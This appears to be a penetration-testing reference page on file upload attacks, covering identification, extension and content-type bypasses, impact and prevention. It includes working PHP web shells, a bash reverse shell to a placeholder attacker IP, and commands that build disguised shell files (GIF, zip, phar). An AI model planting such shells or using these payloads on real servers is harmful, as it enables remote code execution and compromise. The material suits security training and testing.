# File Upload Attacks

## Overview

File upload vulnerabilities allow attackers to upload malicious files to a server. If the application does not properly validate or handle uploaded files, an attacker can achieve remote code execution, defacement, or use the server as a staging point for further attacks.

Common issues include insufficient file type validation, lack of content verification, insecure storage locations, and failure to rename or sanitize uploaded filenames.

## Attack Surface

- Profile picture or avatar uploads
- Document or report uploads
- Image galleries or media uploads
- Any feature that accepts user-supplied files for storage or processing

## Identification

- Locate all upload functionality.
- Determine what the backend expects (extensions, content types, size limits).
- Test with various file types and payloads to see what is accepted and where files are stored.
- Fuzz extensions on known pages (e.g., index.FUZZ) to identify the technology in use.
- "Open image in new tab" or inspect responses to discover upload directories and naming conventions.
- Check if uploaded files are directly accessible via predictable URLs.

## Exploitation

### Basic Approach

1. Identify the technology/language running the application by fuzzing common extensions.
2. Upload a simple test file (e.g., a .txt or image) and note the response and storage location.
3. Attempt to upload web shells or malicious code disguised with acceptable extensions or content.

### Web Shells

Basic PHP shell example:
```php
<?php system($_GET['cmd']); ?>
```

Or a more robust one:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'"); ?>
```

### Bypasses

- Change extensions (e.g., .php5, .phtml, .phar, .inc).
- Use content-type manipulation in requests.
- Double extensions: `shell.php.jpg`
- Null byte in older systems: `shell.php%00.jpg`
- Case variations or encoding.
- Upload as an image but embed code (e.g., `GIF89a<?php ...` saved as .gif).
- Zip files containing shells when the app extracts archives.
- Phar archives for certain deserialization or inclusion chains.

### Limited Uploads and Other Attacks

When direct execution is not possible:
- Upload files that can be used for SSRF, XXE, or other injections when processed.
- Overwrite existing files if path traversal or predictable naming exists.
- Use uploads to poison logs or other files in combination with LFI.

### Tips

- "Open image in new tab" after upload to reveal the actual storage path.
- Fuzz the extension of index pages to identify the backend language.
- Test what happens when you upload files with the same name as existing resources.

## Impact

- Remote code execution and full server compromise
- Data exfiltration or modification
- Defacement or malware distribution
- Using the server to attack internal networks or other systems
- Bypassing other security controls via chained vulnerabilities

## Prevention

- Validate file types using both extension **and** content (magic bytes / MIME type sniffing with caution).
- Store uploaded files outside the web root or in a directory that does not allow script execution.
- Rename files to random, non-predictable names upon upload.
- Implement strict size limits and scan for malware where appropriate.
- Use a whitelist of allowed file types rather than a blacklist.
- Set proper permissions on the upload directory.
- Consider using a dedicated file storage service or CDN that isolates uploads.

## Tools & Payloads

### Creating Test Shells

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php   # for zip-based bypasses
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

### Useful Commands

- Fuzz extensions: `ffuf -w wordlist.txt -u http://target/index.FUZZ`
- Host files for RFI-style testing if needed during upload chains.

**Note**: Combine with LFI/File Inclusion techniques when an upload lands in a location that can be included.
